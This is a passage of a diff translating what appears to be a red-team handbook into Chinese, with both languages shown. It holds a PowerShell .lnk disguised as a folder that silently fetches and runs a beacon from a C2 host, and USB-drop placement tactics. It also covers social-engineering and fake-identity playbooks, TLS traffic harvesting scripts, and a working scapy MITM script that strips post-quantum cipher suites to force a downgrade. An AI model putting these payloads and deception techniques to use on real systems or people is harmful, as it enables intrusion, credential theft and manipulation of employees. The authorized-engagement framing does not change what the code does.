 $shortcut.Arguments = "-nop -w hidden -c `"IEX (New-Object Net.WebClient).DownloadString('https://your-c2.yourdomain.com/b.ps1')`""
-$shortcut.IconLocation = "%SystemRoot%\system32\shell32.dll,3"  # Folder icon
-$shortcut.WindowStyle = 7   # Minimized window: hides the PowerShell window
+$shortcut.IconLocation = "%SystemRoot%\system32\shell32.dll,3"  # 文件夹图标
+$shortcut.WindowStyle = 7   # 最小化窗口：隐藏 PowerShell 窗口
 $shortcut.Save()
-# Result: a .lnk that looks like a folder named "Q4_Bonuses_2027"
-# On double-click: silently pulls and executes the beacon
+# 结果：一个看起来像名为 "Q4_Bonuses_2027" 文件夹的 .lnk
+# 双击时：静默拉取并执行信标
 ```
 
 ```
-DEPLOYMENT STRATEGY:
-  Locations for maximum pickup rate:
-    Parking lot near employee entrance: employees find drives before entering
-    Reception desk: "lost and found" area
-    Break room / kitchen: people are idle, curious
-    Conference room: after a meeting, before the next group arrives
-    Elevator floor: people pick things up reflexively
+投放策略：
+  最高捡取率的位置：
+    员工入口附近的停车场：员工进门前会发现 U 盘
+    前台：失物招领处
+    休息室 / 茶水间：人闲着，好奇
+    会议室：一场会议结束后、下一批人到来前
+    电梯厅：人会条件反射地捡东西
 
-  Label technique: handwrite "Confidential" or "HR 2027" on the drive
-  Icon technique: use a folder icon (.lnk shortcut) so it does not look like an .exe
+  标签技巧：在 U 盘上手写 "Confidential" 或 "HR 2027"
+  图标技巧：用文件夹图标（.lnk 快捷方式），这样不像 .exe
 
-TRACK WHICH DRIVES TRIGGERED:
-  Each drive gets a unique callback URL (GoPhish tracking or unique C2 subdomain)
+跟踪哪些 U 盘被触发：
+  每个 U 盘配一个唯一回连 URL（GoPhish 跟踪或唯一 C2 子域名）
   USB-01: https://c2.yourdomain.com/usb01/beacon.ps1
   USB-02: https://c2.yourdomain.com/usb02/beacon.ps1
-  Report includes: which drives triggered, from which subnets, at what times
+  报告中包含：哪些 U 盘被触发、来自哪些子网、在什么时间
 ```
 
 ---
 
-### 2.6 IN-PERSON SOCIAL ENGINEERING: NON-VERBAL AND BODY LANGUAGE
+### 2.6 面对面社会工程：非语言与肢体语言
 
 ```
-NON-VERBAL SIGNALS OF LEGITIMACY:
+合法身份的非语言信号：
 
-  Posture: upright, open posture signals confidence and authority
-           Slouching or looking around nervously signals uncertainty (detected by guards)
+  姿态：挺直、开放的姿态传递自信与权威
+           驼背或紧张地四处张望传递不确定（保安能看出来）
 
-  Eye contact: make natural eye contact at reception and with security staff
-               Looking away when challenged reads as deceptive
+  眼神：在前台和与保安交流时自然对视
+           被质问时移开视线会被读作欺骗
 
-  Pace: confident, purposeful walk (not fast/running: not slow/hesitant)
+  步速：自信、有目的的行走（不快步跑：也不迟疑拖沓）
 
-  Hands: carry something (clipboard, laptop, bag): hands occupied signals purpose
-         Hands in pockets: signals idleness or nervousness
+  双手：拿点东西（写字板、笔记本、包）：手有事做传递目的性
+         手插口袋：传达闲散或紧张
 
-  Dress: precisely matched to the pretext role
-         Over-dressed for a maintenance role: suspicious
-         Under-dressed for an executive meeting: suspicious
+  着装：与托词角色精确匹配
+         维修角色穿得过于正式：可疑
+         高管会议穿得过于随意：可疑
 
-READING TARGET NON-VERBAL SIGNALS:
-  Signs they are suspicious:
-    - Prolonged eye contact after you have spoken (evaluating you)
-    - Looking at your badge more than once
-    - Pulling out their phone after you pass (checking your credentials)
-    - Following you with their eyes longer than normal
+解读目标的非语言信号：
+  他们起疑的迹象：
+    - 你说话后对方长时间盯着你（在评估你）
+    - 不止一次看你的证件
+    - 你走过之后掏出手机（在核查你的身份）
+    - 用目光跟你的时间比正常更长
     
-  Response to suspicion signals:
-    - Do not increase pace (guilty behavior)
-    - Make brief, natural eye contact and nod (confident acknowledgment)
-    - Continue your current task without deviation
-    - If followed: proceed directly to your stated destination
+  对怀疑信号的应对：
+    - 不要加快脚步（那是心虚的表现）
+    - 做短暂、自然的对视并点头（自信地认可）
+    - 不作偏差地继续当前任务
+    - 若被跟随：直接前往你声称的目的地
 
-BUILDING INSTANT RAPPORT (10-second technique):
-  "Good morning!": brief, warm, matching their energy
-  Name use: "Thanks so much [RECEPTIONIST NAME]": makes interaction personal
-  One genuine observation: "Crazy weather out there today": establishes normalcy
-  Limit: one exchange. Do not over-invest. In-and-out. Natural.
+建立即时融洽感（10 秒技巧）：
+  “早上好！”：简短、温暖，匹配对方的能量
+  用名字：“太感谢了 [前台姓名]”：让互动个性化
+  一句真诚的观察：“今天这天气真够呛”：建立正常感
+  限度：只做一次交流。不要过度投入。进出即可。自然。
 
-HANDLING ESCORT SITUATIONS:
-  If you are escorted: you are observed the whole time.
-  Do not touch anything outside your stated task.
-  Maintain light conversation that reinforces your legend.
-  Deploy hardware implant only if you have a brief moment unobserved (restroom break
-  by the escort is the standard window: ask to use the restroom on the way).
+应对被陪同的情况：
+  如果你被陪同：你全程都在被观察。
+  不要碰你声称任务之外的任何东西。
+  维持能强化你身份的轻松交谈。
+  只有在有短暂无人观察的时刻才部署硬件植入（陪同人员
+  去洗手间是标准窗口：在途中请求使用洗手间）。
   
-  Deploy speed benchmark: 45 seconds from arrival at the port to departure.
-  Practice in the lab until this is comfortable.
+  部署速度基准：从到达端口到离开 45 秒。
+  在实验室练到这个程度再上场。
 ```
 
 ---
 
-### 2.7 PRETEXT ABORT SIGNALS AND RECOVERY
+### 2.7 托词中止信号与恢复
 
 ```
-TIER 1 ABORT (soft stop: continue from a different angle):
-  Signal: target asks a question your legend cannot answer
-  Response: "That is a great question: I am going to need to check with the
-  office and get back to you on that. Can I leave my card?"
-  [Exit without completing the objective. Do not force it. Replan.]
+一级中止（软停：换个角度继续）：
+  信号：目标问了一个你的身份故事答不上来的问题
+  回应：“这个问题问得好：我需要跟办公室确认一下，
+  然后再回复你。我可以留张名片吗？”
+  [未完成目标即离开。不要硬来。重新规划。]
 
-TIER 2 ABORT (hard stop: exit immediately):
-  Signal: target is making a verification call to the real department
-  Response: "Absolutely: please do. I will wait right outside while you sort that out."
-  [Walk to the elevator. Do not come back. The engagement at this entry point is over.]
+二级中止（硬停：立即离开）：
+  信号：目标正在打电话向真实部门核实
+  回应：“当然：请便。我在外面等，你处理好就行。”
+  [走向电梯。不要再回来。这个入口的行动到此结束。]
 
-TIER 3 ABORT (emergency: active challenge):
-  Signal: security guard or manager confronting you directly
-  Response options:
-    A. "My apologies: I think I may have the wrong floor. I am looking for [different floor]."
-       Play confused. Follow their directions. Exit at the first opportunity.
-    B. Show the authorization letter (always carry it): "I have authorization here
-       from [client CISO name]. Would you like to call them to verify?"
-       The letter is your get-out-of-jail card. It exists for exactly this moment.
-    C. If police are called: immediately identify as a red team operator.
-       Invoke the authorization letter and the emergency contact number.
-       Do not resist. Do not lie to law enforcement once physical confrontation occurs.
+三级中止（紧急：当场被质问）：
+  信号：保安或经理直接对你质询
+  可选的回应：
+    A. “抱歉：我想我可能走错楼层了。我在找 [另一楼层]。”
+       装糊涂。按他们的指引走。一有机会就离开。
+    B. 出示授权书（随身携带）：“我这里有 [客户 CISO 姓名]
+       的授权。你要不要打电话向他们核实？”
+       授权书是你的免罪符。它正是为这一刻存在的。
+    C. 若有人报警：立即表明自己是红队操作员。
+       出示授权书和紧急联系电话。
+       不要反抗。一旦发生肢体接触，不要对执法人员说谎。
 
-POST-ABORT PROCEDURE:
-  - Note the time, location, the person who challenged you, and what triggered it
-  - Document in the engagement log
-  - Debrief with team lead before attempting a second entry at the same location
-  - Identify what burned the pretext and fix it before the next attempt
-```
-
----
-
-### 2.8 PERSONA DEVELOPMENT AND IDENTITY LEGENDS
-
-```
-A LEGEND IS NOT A LIE: IT IS A ROLE
-  The best pretext holds under real scrutiny because the details are internally consistent
-  and verifiable enough to be plausible without requiring the target to actually verify them.
-
-LEGEND CONSTRUCTION (4-hour minimum):
-
-  Step 1: Choose a base identity
-    Use a real company that operates in the target industry (visible on LinkedIn)
-    Use a role title that makes your access logical ("IT Support Engineer" for server rooms)
-    Choose a name that is plausible but not easily googled to a specific person
-    (Common first name + common last name = hard to verify as "definitely not a real employee")
-
-  Step 2: Build the legend kit
-    Business cards: Vistaprint or Canva ($15 for 100 cards)
-    Email address: set up before the engagement on your phishing domain or a lookalike
-    Work order: Microsoft Word template with company letterhead (download logo from their site)
-    LinkedIn profile (optional, for high-value targets):
-      Create under the legend name, connect with 50+ generic profiles,
-      set employment to the vendor company,
-      age the profile at least 30 days before use
-
-  Step 3: Stress-test your legend
-    Have a colleague play a suspicious receptionist and ask 10 verification questions.
-    Every question you hesitate on is a gap. Fill the gap before the engagement.
-    Common questions:
-      "What is the ticket number for this work order?"  --> Have one ready (made up but plausible)
-      "Who is your manager?"                            --> Have a name ready
-      "What company are you with again?"               --> Answer without breaking pace
-      "Do you have a photo ID?"                         --> Have a backup (driver license under
-                                                           the legend name is high-effort but available
-                                                           in some jurisdictions via prop sources)
-
-  Step 4: Maintain character for 20+ minutes
-    Role-play as your legend for 20 minutes with a colleague probing you.
-    If you break character before 20 minutes: the legend needs more work.
-
-LEGEND CLEANUP:
-  After every engagement: delete the email account, deactivate the LinkedIn profile,
-  dispose of the business cards (shred). Never reuse the same legend twice.
+中止后流程：
+  - 记录时间、地点、质问你的人，以及是什么触发了它
+  - 写进行动日志
+  - 在同一地点尝试二次进入前，先与组长复盘
+  - 找出是什么暴露了托词，并在下次尝试前修正
 ```
 
 ---
 
-### 2.9 SE CAMPAIGN PLANNING AND METRICS
+### 2.8 人设构建与身份故事
 
 ```
-CAMPAIGN STRUCTURE (multi-wave):
+身份故事不是谎言：它是一个角色
+  最好的托词能经受真实审视，因为细节内在一致，
+  且可核实到足以显得合理，而无须目标真的去核实。
 
-  Wave 1: Phishing (lowest risk, broadest reach)
-    Establish baseline click rate and credential submission rate.
-    Learn which departments are most susceptible before committing to higher-risk vectors.
+身份构建（至少 4 小时）：
 
-  Wave 2: Vishing (higher complexity, higher yield)
-    Target the highest-value roles identified from Wave 1 data.
-    Target people who clicked in Wave 1: they are already susceptible.
+  第 1 步：选择基础身份
+    用一个在目标行业里真实运营的公司（LinkedIn 上可见）
+    用一个让你的权限显得合理的职位名（机房用“IT 支持工程师”）
+    选一个合理但不容易被搜到具体某人的名字
+    （常见名 + 常见姓 = 难以被核实为“绝对不是真实员工”）
 
-  Wave 3: USB Drop (physical escalation)
-    Target locations frequented by employees in susceptible departments.
+  第 2 步：构建身份套件
+    名片：Vistaprint 或 Canva（100 张 15 美元）
+    邮箱地址：行动前在你的钓鱼域名或形似域名上建好
+    工单：带公司信头的 Word 模板（从他们网站下载 logo）
+    LinkedIn 资料（可选，用于高价值目标）：
+      用身份名字创建，连接 50+ 个普通资料，
+      把工作经历设为该厂商，
+      资料在使用前至少养 30 天
 
-  Wave 4: In-Person SE (highest risk, highest yield)
-    Informed by all prior waves. You know the floor, the receptionist name,
-    the IT contact, the badge design. Now you walk in.
+  第 3 步：压力测试你的身份故事
+    让同事扮演多疑的前台，问你 10 个核实性问题。
+    每个你犹豫的问题都是一个缺口。行动前把缺口补上。
+    常见问题：
+      “这张工单的工单号是多少？”   --> 准备好一个（编的但要合理）
+      “你的经理是谁？”             --> 准备好一个名字
+      “你再说一遍你是哪家公司的？”  --> 不打断节奏地回答
+      “你有照片证件吗？”           --> 准备备选（以身份名字办的驾照
+                                       成本很高，但在某些辖区可通过
+                                       道具渠道获得）
 
-SUCCESS METRICS (report in all four categories):
+  第 4 步：保持角色 20 分钟以上
+    与一位不断试探你的同事做 20 分钟的角色扮演。
+    如果不到 20 分钟就出戏：身份故事还需要打磨。
 
-  Email phishing:
-    Open rate (opened / delivered): target > 30%
-    Click rate (clicked / opened): target > 20%
-    Credential submission rate (submitted / clicked): target > 15%
-    Reporting rate (reported to IT / delivered): baseline for client awareness
-
-  Vishing:
-    Calls attempted vs. calls completed (target: 80%+ completion)
-    Information disclosure rate (gave information vs. refused)
-    Credential disclosure rate (gave password/OTP vs. refused)
-    Average call length to successful disclosure
-
-  USB Drop:
-    Drives deployed vs. drives inserted (target: > 40% insertion rate)
-    Payloads executed vs. drives inserted
-    Time from drop to first callback (measures detection gap)
-
-  Physical:
-    Entry attempts vs. successful entries
-    Duration undetected
-    Objectives achieved per entry
-    Number of hardware implants successfully deployed and retrieved
+身份清理：
+  每次行动后：删除邮箱、注销 LinkedIn 资料、
+  销毁名片（碎掉）。绝不复用同一个身份两次。
 ```
 
 ---
 
-## SECTION 3: QUANTUM COMPUTING 2027
+### 2.9 社会工程行动规划与度量
 
-> The cryptographic foundation of almost every secure system you will encounter is mathematically vulnerable to a machine that does not fully exist yet. The key insight: it does not need to exist yet. The data needs to exist now.
+```
+行动结构（多波次）：
+
+  第 1 波：邮件钓鱼（风险最低，触达最广）
+    建立点击率和凭证提交率的基线。
+    在投入更高风险载体之前，先弄清哪些部门最易中招。
+
+  第 2 波：语音钓鱼（复杂度更高，产出更高）
+    针对第 1 波数据中识别出的最高价值角色。
+    针对第 1 波中点击过的人：他们本来就已经易受攻击。
+
+  第 3 波：USB 投放（物理升级）
+    针对易受攻击部门员工常去的地点。
+
+  第 4 波：面对面社会工程（风险最高，产出最高）
+    由前几波信息支撑。你已知楼层、前台姓名、
+    IT 联系人、证件设计。现在你走进去。
+
+成功指标（四个类别都要报告）：
+
+  邮件钓鱼：
+    打开率（打开 / 送达）：目标 > 30%
+    点击率（点击 / 打开）：目标 > 20%
+    凭证提交率（提交 / 点击）：目标 > 15%
+    上报率（上报给 IT / 送达）：客户意识基线
+
+  语音钓鱼：
+    拨打次数 vs. 完成通话数（目标：80%+ 完成率）
+    信息披露率（给了信息 vs. 拒绝）
+    凭证披露率（给了密码/OTP vs. 拒绝）
+    成功披露的平均通话时长
+
+  USB 投放：
+    投放数量 vs. 插入数量（目标：> 40% 插入率）
+    载荷执行数 vs. 插入数
+    从投放到首次回连的时间（衡量检测缺口）
+
+  物理：
+    进入尝试 vs. 成功进入
+    未被发现持续时长
+    每次进入达成的目标
+    成功部署并取回的硬件植入数量
+```
+
+---
+
+## 第 3 部分：2027 年量子计算
+
+> 你会遇到的几乎每一个安全系统的密码学基础，在数学上都抵挡不住一台尚未完全存在的机器。关键洞察是：它不必现在存在。数据必须现在存在。
 
 <div align="center">
 <table><tr><td>
@@ -1885,56 +1885,56 @@ SUCCESS METRICS (report in all four categories):
 
 ---
 
-### 3.1 THE THREAT MODEL
+### 3.1 威胁模型
 
 ```
-WHAT QUANTUM COMPUTING ACTUALLY THREATENS:
+量子计算究竟威胁什么：
 
-ASYMMETRIC CRYPTOGRAPHY (ALL BROKEN by Shor's Algorithm):
-  RSA-2048:       broken in ~hours on a CRQC
-  RSA-4096:       broken in ~days on a CRQC
-  ECDSA P-256:    broken (Shor's discrete log attack)
-  ECDH:           key exchange broken: all past session keys exposed
-  Ed25519:        broken (discrete log on elliptic curve)
-  DH-2048/4096:   broken
+非对称密码学（全部被 Shor 算法攻破）：
+  RSA-2048：      在 CRQC 上约数小时内攻破
+  RSA-4096：      在 CRQC 上约数天内攻破
+  ECDSA P-256：   已攻破（Shor 离散对数攻击）
+  ECDH：          密钥交换已攻破：所有历史会话密钥暴露
+  Ed25519：       已攻破（椭圆曲线上的离散对数）
+  DH-2048/4096：  已攻破
   
-  These protect: HTTPS/TLS, SSH, PGP, JWT (RS256/ES256), S/MIME,
-                 VPN (IKE phase 1/2), code signing, Bitcoin/Ethereum
+  这些保护着：HTTPS/TLS、SSH、PGP、JWT（RS256/ES256）、S/MIME、
+                 VPN（IKE 阶段 1/2）、代码签名、比特币/以太坊
 
-SYMMETRIC CRYPTOGRAPHY (weakened but NOT fully broken):
-  AES-128:  Grover's algorithm gives effective 64-bit security: BROKEN post-CRQC
-  AES-256:  Grover's gives effective 128-bit security: SAFE
-  SHA-256:  Grover's halves preimage resistance: still adequate
-  ChaCha20: safe (symmetric stream cipher)
+对称密码学（被削弱但未完全攻破）：
+  AES-128：  Grover 算法给出等效 64 位安全性：CRQC 之后被攻破
+  AES-256：  Grover 给出等效 128 位安全性：安全
+  SHA-256：  Grover 使原像抗性减半：仍然够用
+  ChaCha20：安全（对称流密码）
 
-UNDERSTANDING SHOR'S ALGORITHM (for client explanation):
-  Classical computers factor large numbers in O(exponential) time.
-  A quantum computer using Shor's does it in polynomial time O((log N)^3).
-  Practical meaning: RSA-2048 factoring classically takes longer than the age
-  of the universe. A CRQC does it in hours. RSA's security is gone.
+理解 SHOR 算法（用于向客户解释）：
+  经典计算机以指数级时间分解大数。
+  使用 Shor 算法的量子计算机用多项式时间 O((log N)^3) 完成。
+  实际含义：经典方式分解 RSA-2048 所需时间超过宇宙
+  的年龄。CRQC 只需数小时。RSA 的安全性不复存在。
 
-UNDERSTANDING GROVER'S ALGORITHM:
-  Grover's searches an unstructured space in O(sqrtN) instead of O(N).
-  AES-128: 2^128 classical ops --> 2^64 with Grover's --> broken.
-  AES-256: 2^256 --> 2^128 --> still computationally infeasible. Use AES-256.
+理解 GROVER 算法：
+  Grover 以 O(sqrtN) 而非 O(N) 搜索无结构空间。
+  AES-128：2^128 次经典运算 --> Grover 后 2^64 --> 被攻破。
+  AES-256：2^256 --> 2^128 --> 在计算上仍不可行。请用 AES-256。
 
-KEY INSIGHT: THE SNDL THREAT
-  You do not need a CRQC today.
-  You need the TRAFFIC captured today.
-  Store Now, Decrypt Later (SNDL): harvest encrypted traffic now,
-  archive it, decrypt it when CRQC is available in 5-10 years.
+关键洞察：SNDL 威胁
+  你今天不需要 CRQC。
+  你需要今天捕获的流量。
+  存储现在、解密以后（SNDL）：现在就采集加密流量，
+  归档，等 5-10 年后有 CRQC 时再解密。
   
-  Nation-state adversaries began SNDL programs circa 2018.
-  High-value targets: government comms, financial systems, healthcare records,
-  executive email, VPN sessions, SSH administrative sessions.
+  民族国家对手约在 2018 年就启动了 SNDL 项目。
+  高价值目标：政府通信、金融系统、医疗记录、
+  高管邮件、VPN 会话、SSH 管理会话。
   
-  As a red team operator: demonstrate SNDL capability. Show the client what
-  is being harvested today that will be readable in 2032.
+  作为红队操作员：展示 SNDL 能力。向客户说明今天
+  正在被采集的哪些内容会在 2032 年变得可读。
 ```
 
 ---
 
-### 3.2 SNDL COLLECTION INFRASTRUCTURE
+### 3.2 SNDL 收集基础设施
 
 <div align="center">
 <table><tr><td>
@@ -1947,28 +1947,28 @@ KEY INSIGHT: THE SNDL THREAT
 ---
 
 ```bash
-# ===== ZEEK SETUP FOR PROTOCOL-AWARE COLLECTION =====
+# ===== ZEEK 面向协议的采集配置 =====
 
-# Install Zeek on Ubuntu 22.04+:
+# 在 Ubuntu 22.04+ 上安装 Zeek：
 sudo apt-get update && sudo apt-get install -y zeek zeek-broctl
 echo 'export PATH=/opt/zeek/bin:$PATH' >> ~/.bashrc && source ~/.bashrc
 
-# Configure capture interface in /opt/zeek/etc/node.cfg:
+# 在 /opt/zeek/etc/node.cfg 中配置采集网卡：
 # [zeek]
 # type=standalone
 # host=localhost
 # interface=eth0
 
-# Run Zeek:
+# 运行 Zeek：
 zeekctl deploy
 
-# Zeek auto-generates structured logs in /opt/zeek/logs/current/:
-# ssl.log   : TLS sessions (cipher suites, cert chains, JA3 fingerprints)
-# ssh.log   : SSH sessions (key exchange algorithm, cipher, MAC)
-# x509.log  : certificate details (key type, key size, subject, issuer)
-# conn.log  : all connections (src/dst/port/duration/bytes)
+# Zeek 会在 /opt/zeek/logs/current/ 自动生成结构化日志：
+# ssl.log   : TLS 会话（密码套件、证书链、JA3 指纹）
+# ssh.log   : SSH 会话（密钥交换算法、密码、MAC）
+# x509.log  : 证书详情（密钥类型、密钥长度、主题、签发者）
+# conn.log  : 所有连接（源/目/端口/时长/字节）
 
-# SNDL FILTER: flag quantum-vulnerable TLS sessions:
+# SNDL 过滤：标记受量子威胁的 TLS 会话：
 cat > /opt/zeek/share/zeek/site/sndl-filter.zeek << 'EOF'
 @load base/protocols/ssl
 
@@ -1977,7 +1977,7 @@ event ssl_established(c: connection)
     local cipher = (c$ssl?$cipher)  ? c$ssl$cipher  : "";
     local subject = (c$ssl?$subject) ? c$ssl$subject : "";
 
-    # Flag quantum-vulnerable cipher suites:
+    # 标记受量子威胁的密码套件：
     if (/RSA/ in cipher || /ECDSA/ in cipher || /ECDHE/ in cipher || /DHE/ in cipher)
         {
         print fmt("[SNDL] %s -> %s | Cipher: %s | Subject: %s | Port: %s",
@@ -1991,35 +1991,35 @@ zeekctl restart
 ```
 
 ```bash
-# ===== TARGETED PCAP COLLECTION =====
-# Store TLS handshakes for future decryption.
-# The handshake contains the key exchange material.
+# ===== 定向 PCAP 采集 =====
+# 存储 TLS 握手，供未来解密。
+# 握手中包含密钥交换材料。
 
-# Capture full TLS handshakes (common TLS ports):
+# 捕获完整 TLS 握手（常见 TLS 端口）：
 tcpdump -i eth0 \
   'tcp and (port 443 or port 8443 or port 465 or port 993 or port 995)' \
   -w /storage/sndl/raw/$(date +%Y%m%d_%H%M%S)_tls.pcap \
-  -G 3600 \       # Rotate capture file every 1 hour
-  -C 500 \        # Rotate at 500MB (whichever comes first)
-  -z gzip         # Compress each rotated file immediately
+  -G 3600 \       # 每 1 小时轮转采集文件
+  -C 500 \        # 达到 500MB 时轮转（以先到者为准）
+  -z gzip         # 立即压缩每个轮转文件
 
-# Capture VPN/IPsec key exchange (IKE negotiations):
+# 捕获 VPN/IPsec 密钥交换（IKE 协商）：
 tcpdump -i eth0 '(udp port 500 or udp port 4500)' \
   -w /storage/sndl/raw/$(date +%Y%m%d_%H%M%S)_vpn.pcap -G 3600 -z gzip
 
-# Capture SSH key exchange (first 2KB of each SSH session):
+# 捕获 SSH 密钥交换（每个 SSH 会话的前 2KB）：
 tcpdump -i eth0 'tcp port 22' \
-  -s 2048 \       # Snap length: first 2KB per packet (key exchange only)
+  -s 2048 \       # 抓包长度：每个包前 2KB（仅密钥交换）
   -w /storage/sndl/raw/$(date +%Y%m%d_%H%M%S)_ssh.pcap -G 3600 -z gzip
 
-# STORAGE SCHEMA:
+# 存储结构：
 # /storage/sndl/
-#   raw/          <- compressed PCAPs (organized by date)
-#   processed/    <- Zeek logs (JSON format, indexed)
-#   index/        <- SQLite DB for future retrieval queries
-#   metadata/     <- source info, collection date, target classification
+#   raw/          <- 压缩的 PCAP（按日期组织）
+#   processed/    <- Zeek 日志（JSON 格式，已建索引）
+#   index/        <- 用于未来检索查询的 SQLite 库
+#   metadata/     <- 来源信息、采集日期、目标分类
 
-# SQLite index for future retrieval:
+# 用于未来检索的 SQLite 索引：
 sqlite3 /storage/sndl/index/collection.db << 'SQLEOF'
 CREATE TABLE IF NOT EXISTS captures (
     id           INTEGER PRIMARY KEY,
@@ -2046,30 +2046,30 @@ echo "[*] SNDL collection infrastructure ready."
 
 ---
 
-### 3.3 PQC MIGRATION ATTACK: DOWNGRADE
+### 3.3 PQC 迁移攻击：降级
 
 ```
-THE ATTACK CONCEPT:
-  During the 2025-2030 PQC migration window, servers offer HYBRID mode:
-  both classical (RSA/ECDH) AND PQC (ML-KEM) cipher suites in their TLS ServerHello.
+攻击概念：
+  在 2025-2030 的 PQC 迁移窗口内，服务器会提供混合模式：
+  在 TLS ServerHello 中同时给出经典（RSA/ECDH）和 PQC（ML-KEM）密码套件。
 
-  Attack: if an MITM attacker strips ML-KEM cipher suites from the TLS ClientHello
-  before it reaches the server, the server falls back to classical cipher suites
-  (it thinks the client does not support PQC).
+  攻击：如果中间人攻击者在 TLS ClientHello 到达服务器之前
+  剥离其中的 ML-KEM 密码套件，服务器就会回退到经典密码套件
+  （它以为客户端不支持 PQC）。
   
-  Result: session uses RSA/ECDH --> quantum-vulnerable --> archive with SNDL.
+  结果：会话使用 RSA/ECDH --> 受量子威胁 --> 用 SNDL 归档。
   
-  Prerequisites:
-    MITM position on the network (ARP spoofing, rogue AP, LAN Turtle implant)
-    Target server must support hybrid TLS (2025-2030 migration window)
+  前提条件：
+    在网络中占据中间人位置（ARP 欺骗、流氓 AP、LAN Turtle 植入）
+    目标服务器必须支持混合 TLS（2025-2030 迁移窗口）
 ```
 
 ```python
 #!/usr/bin/env python3
 """
-PQC Downgrade Attack: Strip ML-KEM from TLS ClientHello
-Forces server to fall back to classical (quantum-vulnerable) cipher suites.
-Requirements: pip3 install scapy
+PQC 降级攻击：从 TLS ClientHello 中剥离 ML-KEM
+强制服务器回退到经典（受量子威胁的）密码套件。
+要求：pip3 install scapy
 """
 
 from scapy.all import *
@@ -2078,7 +2078,7 @@ import struct, logging
 logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
 log = logging.getLogger(__name__)
 
-# ML-KEM / PQC cipher suite identifiers (IANA assigned 2024):
+# ML-KEM / PQC 密码套件标识（IANA 2024 年分配）：
 PQC_CIPHER_IDS = {
     b'\x63\x99',  # TLS_ECDHE_MLKEM768_RSA_WITH_AES_256_GCM_SHA384
     b'\x63\x9A',  # TLS_ECDHE_MLKEM768_ECDSA_WITH_AES_256_GCM_SHA384
@@ -2086,7 +2086,7 @@ PQC_CIPHER_IDS = {
     b'\xFE\x31',  # TLS_ML_KEM_1024 (draft implementations)
 }
 
-# PQC group identifiers in TLS supported_groups extension:
+# TLS supported_groups 扩展中的 PQC 组标识：
 PQC_GROUP_IDS = {
     0x0200,  # X25519MLKEM768
     0x0201,  # SecP256r1MLKEM768
@@ -2099,7 +2099,7 @@ TLS_EXT_KEY_SHARE        = 0x0033
 
 
 def strip_pqc_from_cipher_suites(data: bytes) -> bytes:
-    """Remove ML-KEM cipher suites from the cipher suites list."""
+    """从密码套件列表中移除 ML-KEM 密码套件。"""
     out, removed = bytearray(), 0
     for i in range(0, len(data) - 1, 2):
         pair = data[i:i+2]
@@ -2113,7 +2113,7 @@ def strip_pqc_from_cipher_suites(data: bytes) -> bytes:
 
 
 def strip_pqc_from_supported_groups(ext_data: bytes) -> bytes:
-    """Remove ML-KEM groups from supported_groups extension."""
+    """从 supported_groups 扩展中移除 ML-KEM 组。"""
     if len(ext_data) < 2:
         return ext_data
     list_len = struct.unpack('!H', ext_data[:2])[0]
@@ -2132,7 +2132,7 @@ def strip_pqc_from_supported_groups(ext_data: bytes) -> bytes:
 
 
 def patch_client_hello(raw_tls: bytes) -> bytes:
-    """Parse a raw TLS ClientHello and strip all PQC identifiers."""
+    """解析原始 TLS ClientHello 并剥离所有 PQC 标识。"""
     if len(raw_tls) < 5:
         return raw_tls
     ct, vm, vn, rec_len = struct.unpack('!BBBH', raw_tls[:5])
@@ -2142,7 +2142,7 @@ def patch_client_hello(raw_tls: bytes) -> bytes:
     if payload[0] != 0x01:  # 0x01 = ClientHello
         return raw_tls
 
-    offset = 4 + 34  # Skip handshake header (4) + ClientVersion + Random (34)
+    offset = 4 + 34  # 跳过握手头（4）+ ClientVersion + Random（34）
     session_id_len = payload[offset]
     offset += 1 + session_id_len
 
@@ -2195,11 +2195,11 @@ def patch_client_hello(raw_tls: bytes) -> bytes:
     return struct.pack('!BBBH', ct, vm, vn, len(payload)) + bytes(payload)
 
 
-TARGET_IP = "10.0.0.1"   # Server IP you are intercepting toward
+TARGET_IP = "10.0.0.1"   # 你正在拦截、要发往的服务器 IP
 IFACE     = "eth0"
 
 def packet_callback(pkt):
-    """Intercept TCP packets: patch TLS ClientHellos."""
+    """拦截 TCP 包：修补 TLS ClientHello。"""
     if pkt.haslayer(TCP) and pkt.haslayer(Raw):
         data = bytes(pkt[Raw].load)
         if len(data) > 5 and data[0] == 0x16 and data[1] == 0x03 and data[5] == 0x01:
@@ -2223,50 +2223,50 @@ if __name__ == "__main__":
 
 ---
 
-### 3.4 ML-KEM TIMING SIDE-CHANNEL ANALYSIS
+### 3.4 ML-KEM 时序侧信道分析
 
 ```bash
-# ===== COMPLETE LAB SETUP =====
+# ===== 完整实验环境搭建 =====
 
 sudo apt-get update
 sudo apt-get install -y python3-pip cmake ninja-build libssl-dev git build-essential
 
-# Install liboqs (Open Quantum Safe):
+# 安装 liboqs（Open Quantum Safe）：
 git clone --depth 1 https://github.com/open-quantum-safe/liboqs
 cd liboqs && mkdir build && cd build
 cmake -GNinja -DCMAKE_BUILD_TYPE=Release -DOQS_ENABLE_KEM_KYBER=ON ..
 ninja && sudo ninja install && sudo ldconfig && cd ../..
 
-# Install Python OQS bindings + analysis tools:
+# 安装 Python OQS 绑定与分析工具：
 pip3 install oqs numpy scipy matplotlib --break-system-packages
 
-# Verify:
+# 验证：
 python3 -c "import oqs; print('OQS OK:', oqs.get_enabled_KEM_mechanisms())"
 ```
 
 ```python
 #!/usr/bin/env python3
 """
-ML-KEM Timing Side-Channel Analysis Lab
-Demonstrates timing variance in decapsulation for valid vs. invalid ciphertexts.
+ML-KEM 时序侧信道分析实验
+演示有效密文与无效密文在解封装时的时序差异。
 
-IMPORTANT NOTES FOR ACCURACY:
-  - Real side-channel work requires >100,000 samples (this script shows the method)
-  - For statistically significant results: pin CPU affinity and disable OS jitter:
+关于准确性的重要说明：
+  - 真实的侧信道工作需要超过 100,000 个样本（本脚本只演示方法）
+  - 要得到统计显著的结果：绑定 CPU 亲和性并关闭系统抖动：
       taskset -c 0 python3 mlkem_timing.py
-      (pins the process to CPU core 0: reduces OS scheduling interference)
-  - Use RDTSC-level timing for nanosecond precision (requires ctypes + Linux perf)
-  - General-purpose OS introduces ~50-200ns jitter: use bare metal, not a VM
+      （把进程绑定到 0 号 CPU 核：减少操作系统调度干扰）
+  - 使用 RDTSC 级计时以获得纳秒精度（需要 ctypes + Linux perf）
+  - 通用操作系统会引入约 50-200ns 抖动：用裸机，不要用虚拟机
 
-Requirements: oqs numpy scipy matplotlib
+要求：oqs numpy scipy matplotlib
 """
 
 import time, oqs, numpy as np, scipy.stats as stats
 import matplotlib.pyplot as plt, secrets
 
 KEM_ALGORITHM = "ML-KEM-768"
